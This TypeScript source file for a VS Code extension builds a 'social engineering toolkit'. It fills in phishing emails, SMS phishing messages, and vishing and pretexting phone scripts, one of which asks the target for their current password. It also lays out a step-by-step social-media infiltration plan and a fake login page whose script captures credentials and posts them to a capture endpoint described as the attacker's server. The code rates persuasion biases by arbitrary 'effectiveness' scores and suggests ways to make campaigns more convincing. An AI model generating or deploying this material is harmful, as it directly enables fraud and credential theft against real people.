import * as vscode from 'vscode';
import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';

// Advanced Social Engineering Toolkit
export class SocialEngineeringToolkit {
  private context: vscode.ExtensionContext;
  private templates: SocialEngineeringTemplate[] = [];
  private campaigns: SocialEngineeringCampaign[] = [];
  private psychologicalProfiles: PsychologicalProfile[] = [];

  constructor(context: vscode.ExtensionContext) {
    this.context = context;
    this.initializeTemplates();
    this.loadPsychologicalProfiles();
  }

  private initializeTemplates(): void {
    this.templates = [
      {
        id: 'phishing-email',
        name: 'Phishing Email',
        category: 'email',
        description: 'Generate convincing phishing emails',
        template: this.getPhishingEmailTemplate(),
        variables: ['target_name', 'company_name', 'sender_name', 'urgency_level']
      },
      {
        id: 'smishing-sms',
        name: 'SMiShing SMS',
        category: 'sms',
        description: 'Generate SMS phishing messages',
        template: this.getSMiShingTemplate(),
        variables: ['target_name', 'service_name', 'urgency_level']
      },
      {
        id: 'vishing-script',
        name: 'Vishing Script',
        category: 'voice',
        description: 'Generate voice phishing scripts',
        template: this.getVishingScriptTemplate(),
        variables: ['target_name', 'company_name', 'scenario']
      },
      {
        id: 'fake-website',
        name: 'Fake Website',
        category: 'web',
        description: 'Generate fake website templates',
        template: this.getFakeWebsiteTemplate(),
        variables: ['target_company', 'login_page', 'branding']
      },
      {
        id: 'social-media',
        name: 'Social Media Attack',
        category: 'social',
        description: 'Generate social media attack strategies',
        template: this.getSocialMediaTemplate(),
        variables: ['platform', 'target_profile', 'attack_type']
      },
      {
        id: 'pretexting',
        name: 'Pretexting',
        category: 'pretext',
        description: 'Generate pretexting scenarios',
        template: this.getPretextingTemplate(),
        variables: ['scenario', 'authority_figure', 'target_role']
      }
    ];
  }

  private loadPsychologicalProfiles(): void {
    this.psychologicalProfiles = [
      {
        id: 'authority-bias',
        name: 'Authority Bias',
        description: 'People tend to comply with requests from authority figures',
        techniques: ['impersonation', 'official_language', 'urgency'],
        effectiveness: 0.85
      },
      {
        id: 'social-proof',
        name: 'Social Proof',
        description: 'People follow the actions of others',
        techniques: ['peer_pressure', 'testimonials', 'popularity'],
        effectiveness: 0.78
      },
      {
        id: 'scarcity',
        name: 'Scarcity',
        description: 'People value things more when they are scarce',
        techniques: ['limited_time', 'exclusive_access', 'urgency'],
        effectiveness: 0.82
      },
      {
        id: 'reciprocity',
        name: 'Reciprocity',
        description: 'People feel obligated to return favors',
        techniques: ['free_gifts', 'helpful_actions', 'kindness'],
        effectiveness: 0.76
      },
      {
        id: 'commitment',
        name: 'Commitment and Consistency',
        description: 'People want to be consistent with their commitments',
        techniques: ['small_commitments', 'public_statements', 'consistency'],
        effectiveness: 0.79
      },
      {
        id: 'liking',
        name: 'Liking',
        description: 'People are more likely to comply with people they like',
        techniques: ['similarity', 'compliments', 'cooperation'],
        effectiveness: 0.81
      }
    ];
  }

  // Main social engineering methods
  async generateCampaign(target: string, campaignType: string, parameters: any): Promise<SocialEngineeringCampaign> {
    const campaign: SocialEngineeringCampaign = {
      id: crypto.randomUUID(),
      target: target,
      type: campaignType,
      startTime: new Date(),
      status: 'planning',
      templates: [],
      psychologicalProfiles: [],
      successRate: 0,
      results: []
    };

    // Select appropriate templates
    const selectedTemplates = this.selectTemplates(campaignType);
    campaign.templates = selectedTemplates;

    // Select psychological profiles
    const selectedProfiles = this.selectPsychologicalProfiles(campaignType);
    campaign.psychologicalProfiles = selectedProfiles;

    // Generate campaign content
    await this.generateCampaignContent(campaign, parameters);

    // Save campaign
    this.campaigns.push(campaign);
    await this.saveCampaign(campaign);

    return campaign;
  }

  private selectTemplates(campaignType: string): SocialEngineeringTemplate[] {
    const typeMapping: { [key: string]: string[] } = {
      'phishing': ['phishing-email', 'fake-website'],
      'smishing': ['smishing-sms'],
      'vishing': ['vishing-script'],
      'social-media': ['social-media'],
      'pretexting': ['pretexting'],
      'comprehensive': ['phishing-email', 'smishing-sms', 'vishing-script', 'fake-website', 'social-media']
    };

    const templateIds = typeMapping[campaignType] || ['phishing-email'];
    return this.templates.filter(template => templateIds.includes(template.id));
  }

  private selectPsychologicalProfiles(campaignType: string): PsychologicalProfile[] {
    const profileMapping: { [key: string]: string[] } = {
      'phishing': ['authority-bias', 'urgency', 'scarcity'],
      'smishing': ['urgency', 'authority-bias'],
      'vishing': ['authority-bias', 'social-proof'],
      'social-media': ['social-proof', 'liking'],
      'pretexting': ['authority-bias', 'reciprocity'],
      'comprehensive': ['authority-bias', 'social-proof', 'scarcity', 'reciprocity', 'commitment', 'liking']
    };

    const profileIds = profileMapping[campaignType] || ['authority-bias'];
    return this.psychologicalProfiles.filter(profile => profileIds.includes(profile.id));
  }

  private async generateCampaignContent(campaign: SocialEngineeringCampaign, parameters: any): Promise<void> {
    for (const template of campaign.templates) {
      const content = await this.generateTemplateContent(template, parameters);
      campaign.results.push({
        template: template.id,
        content: content,
        generated: new Date()
      });
    }
  }

  private async generateTemplateContent(template: SocialEngineeringTemplate, parameters: any): Promise<string> {
    let content = template.template;

    // Replace variables in template
    for (const variable of template.variables) {
      const value = parameters[variable] || this.generateDefaultValue(variable);
      content = content.replace(new RegExp(`\\{\\{${variable}\\}\\}`, 'g'), value);
    }

    // Apply psychological techniques
    content = this.applyPsychologicalTechniques(content, template.category);

    return content;
  }

  private generateDefaultValue(variable: string): string {
    const defaults: { [key: string]: string } = {
      'target_name': 'John Doe',
      'company_name': 'Acme Corporation',
      'sender_name': 'IT Support',
      'urgency_level': 'URGENT',
      'service_name': 'Banking Service',
      'target_company': 'Target Company',
      'login_page': 'Login Portal',
      'branding': 'Corporate Branding',
      'platform': 'LinkedIn',
      'target_profile': 'Professional Profile',
      'attack_type': 'Connection Request',
      'scenario': 'Technical Support',
      'authority_figure': 'IT Administrator',
      'target_role': 'Employee'
    };

    return defaults[variable] || 'Default Value';
  }

  private applyPsychologicalTechniques(content: string, category: string): string {
    // Apply psychological techniques based on category
    switch (category) {
      case 'email':
        return this.applyEmailTechniques(content);
      case 'sms':
        return this.applySMSTechniques(content);
      case 'voice':
        return this.applyVoiceTechniques(content);
      case 'web':
        return this.applyWebTechniques(content);
      case 'social':
        return this.applySocialTechniques(content);
      default:
        return content;
    }
  }

  private applyEmailTechniques(content: string): string {
    // Add urgency indicators
    content = content.replace(/URGENT/g, 'URGENT - ACTION REQUIRED');
    
    // Add authority indicators
    content = content.replace(/IT Support/g, 'IT Security Department');
    
    // Add scarcity indicators
    content += '\n\n[WARNING] This offer expires in 24 hours. Limited time only.';
    
    return content;
  }

  private applySMSTechniques(content: string): string {
    // Add urgency
    content = content.replace(/URGENT/g, 'URGENT');
    
    // Add authority
    content = content.replace(/Banking Service/g, 'Your Bank Security Team');
    
    return content;
  }

  private applyVoiceTechniques(content: string): string {
    // Add authority language
    content = content.replace(/IT Administrator/g, 'Senior IT Security Administrator');
    
    // Add urgency
    content += '\n\nThis is a time-sensitive security matter that requires immediate attention.';
    
    return content;
  }

  private applyWebTechniques(content: string): string {
    // Add trust indicators
    content = content.replace(/Login Portal/g, 'Secure Login Portal');
    
    // Add urgency
    content += '\n\n<div class="alert alert-warning">Your account will be suspended in 24 hours if you do not verify your information.</div>';
    
    return content;
  }

  private applySocialTechniques(content: string): string {
    // Add social proof
    content = content.replace(/Professional Profile/g, 'Verified Professional Profile');
    
    // Add similarity
    content += '\n\nI noticed we have mutual connections and similar professional interests.';
    
    return content;
  }

  // Template generators
  private getPhishingEmailTemplate(): string {
    return `
Subject: {{urgency_level}} - {{company_name}} Security Alert

Dear {{target_name}},

This is {{sender_name}} from {{company_name}} IT Security Department.

We have detected suspicious activity on your account and need to verify your identity immediately to prevent unauthorized access.

Please click the link below to verify your account:

[VERIFICATION LINK]

This is a time-sensitive security matter. Failure to verify your account within 24 hours will result in account suspension.

If you did not request this verification, please contact our security team immediately.

Best regards,
{{sender_name}}
IT Security Department
{{company_name}}

---
This email was sent from a secure server. Do not reply to this email.
`;
  }

  private getSMiShingTemplate(): string {
    return `
{{service_name}} Alert: {{urgency_level}}

{{target_name}}, your account has been flagged for suspicious activity. 

Verify your identity now: [LINK]

Reply STOP to opt out.

{{service_name}} Security Team
`;
  }

  private getVishingScriptTemplate(): string {
    return `
VISHING SCRIPT - {{scenario}}

Hello, this is {{authority_figure}} calling from {{company_name}} IT Security Department.

I'm calling regarding a security incident that requires your immediate attention. We've detected unauthorized access attempts on your account.

To verify your identity and secure your account, I need to confirm some information:

1. Can you please confirm your full name?
2. What is your employee ID?
3. Can you verify your date of birth?
4. What is your current password?

This is a time-sensitive security matter. We need to resolve this immediately to prevent further unauthorized access.

If you have any questions, please call our security hotline at [PHONE NUMBER].

Thank you for your cooperation.
`;
  }

  private getFakeWebsiteTemplate(): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{target_company}} - {{login_page}}</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .alert { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>{{target_company}}</h2>
            <p>{{login_page}}</p>
        </div>
        
        <div class="alert">
            <strong>Security Notice:</strong> Please verify your account to continue.
        </div>
        
        <form action="/login" method="post">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="text" id="email" name="email" required>
            </div>
            
            <button type="submit" class="btn">Verify Account</button>
        </form>
        
        <p style="text-align: center; margin-top: 20px; font-size: 12px; color: #666;">
            © 2024 {{target_company}}. All rights reserved.
        </p>
    </div>
    
    <script>
        // Capture form data
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            const data = Object.fromEntries(formData);
            
            // Send data to attacker's server
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            
            // Show fake success message
            alert('Account verified successfully! Redirecting...');
        });
    </script>
</body>
</html>
`;
  }

  private getSocialMediaTemplate(): string {
    return `
SOCIAL MEDIA ATTACK STRATEGY - {{platform}}

Target: {{target_profile}}
Attack Type: {{attack_type}}

Phase 1: Reconnaissance
- Analyze target's profile and connections
- Identify mutual connections
- Study posting patterns and interests
- Note personal information shared

Phase 2: Connection Establishment
- Send connection request with personalized message
- Reference mutual connections or shared interests
- Use professional language and credentials

Phase 3: Trust Building
- Engage with target's posts and content
- Share relevant industry information
- Offer helpful resources or connections
- Maintain consistent professional persona

Phase 4: Information Gathering
- Ask about work projects and challenges
- Inquire about company technology stack
- Discuss security practices and policies
- Gather information about colleagues and processes

Phase 5: Attack Execution
- Share malicious links or documents
- Request sensitive information
- Suggest meeting or call for "business opportunity"
- Exploit gathered information for further attacks

Sample Connection Message:
"Hi {{target_name}}, I noticed we have mutual connections in the cybersecurity field. I'm working on a new security initiative and would love to connect with professionals like yourself. Would you be interested in a brief conversation about industry trends?"

Follow-up Messages:
- Share relevant security articles
- Ask about current projects
- Offer to introduce to other professionals
- Suggest collaboration opportunities
`;
  }

  private getPretextingTemplate(): string {
    return `
PRETEXTING SCENARIO - {{scenario}}

Role: {{authority_figure}}
Target: {{target_role}}
Company: {{company_name}}

Scenario: {{scenario}}

Script:
"Hello, this is {{authority_figure}} calling from {{company_name}}. I'm conducting a security audit and need to verify some information with you.

I understand you're busy, but this is a routine security check that we're required to perform. It should only take a few minutes.

Can you please confirm:
1. Your full name and employee ID?
2. Your current department and role?
3. What systems do you typically access?
4. Who is your direct supervisor?
5. What security training have you completed recently?

This information helps us ensure our security protocols are up to date and that all employees have appropriate access levels.

I appreciate your cooperation with this important security matter."

Follow-up Questions:
- Ask about recent security incidents
- Inquire about password policies
- Discuss access control procedures
- Gather information about other employees

Documentation:
- Record all information provided
- Note any security weaknesses mentioned
- Identify potential targets for further attacks
- Document social engineering success factors
`;
  }

  // Campaign management
  private async saveCampaign(campaign: SocialEngineeringCampaign): Promise<void> {
    const campaignPath = path.join(this.context.globalStorageUri.fsPath, `campaign-${campaign.id}.json`);
    await fs.promises.writeFile(campaignPath, JSON.stringify(campaign, null, 2));
  }

  async loadCampaigns(): Promise<SocialEngineeringCampaign[]> {
    try {
      const files = await fs.promises.readdir(this.context.globalStorageUri.fsPath);
      const campaignFiles = files.filter(file => file.startsWith('campaign-') && file.endsWith('.json'));
      
      const campaigns: SocialEngineeringCampaign[] = [];
      for (const file of campaignFiles) {
        const filePath = path.join(this.context.globalStorageUri.fsPath, file);
        const content = await fs.promises.readFile(filePath, 'utf8');
        const campaign = JSON.parse(content);
        campaigns.push(campaign);
      }
      
      return campaigns;
    } catch (error) {
      console.error('Failed to load campaigns:', error);
      return [];
    }
  }

  // Analysis and reporting
  async analyzeCampaignEffectiveness(campaignId: string): Promise<CampaignAnalysis> {
    const campaign = this.campaigns.find(c => c.id === campaignId);
    if (!campaign) {
      throw new Error('Campaign not found');
    }

    const analysis: CampaignAnalysis = {
      campaignId: campaignId,
      target: campaign.target,
      type: campaign.type,
      effectiveness: 0,
      psychologicalTechniques: [],
      recommendations: [],
      successFactors: [],
      failureFactors: []
    };

    // Analyze psychological techniques used
    for (const profile of campaign.psychologicalProfiles) {
      analysis.psychologicalTechniques.push({
        technique: profile.name,
        effectiveness: profile.effectiveness,
        description: profile.description
      });
    }

    // Calculate overall effectiveness
    analysis.effectiveness = campaign.psychologicalProfiles.reduce((sum, profile) => sum + profile.effectiveness, 0) / campaign.psychologicalProfiles.length;

    // Generate recommendations
    analysis.recommendations = this.generateRecommendations(campaign);

    return analysis;
  }

  private generateRecommendations(campaign: SocialEngineeringCampaign): string[] {
    const recommendations: string[] = [];

    if (campaign.psychologicalProfiles.some(p => p.id === 'authority-bias')) {
      recommendations.push('Consider using more authoritative language and official-looking communications');
    }

    if (campaign.psychologicalProfiles.some(p => p.id === 'urgency')) {
      recommendations.push('Increase urgency indicators and time-sensitive language');
    }

    if (campaign.psychologicalProfiles.some(p => p.id === 'social-proof')) {
      recommendations.push('Add social proof elements like testimonials or peer references');
    }

    return recommendations;
  }
}

// Interfaces
interface SocialEngineeringTemplate {
  id: string;
  name: string;
  category: string;
  description: string;
  template: string;
  variables: string[];
}

interface SocialEngineeringCampaign {
  id: string;
  target: string;
  type: string;
  startTime: Date;
  status: 'planning' | 'active' | 'completed' | 'failed';
  templates: SocialEngineeringTemplate[];
  psychologicalProfiles: PsychologicalProfile[];
  successRate: number;
  results: CampaignResult[];
}

interface PsychologicalProfile {
  id: string;
  name: string;
  description: string;
  techniques: string[];
  effectiveness: number;
}

interface CampaignResult {
  template: string;
  content: string;
  generated: Date;
}

interface CampaignAnalysis {
  campaignId: string;
  target: string;
  type: string;
  effectiveness: number;
  psychologicalTechniques: TechniqueAnalysis[];
  recommendations: string[];
  successFactors: string[];
  failureFactors: string[];
}

interface TechniqueAnalysis {
  technique: string;
  effectiveness: number;
  description: string;
}




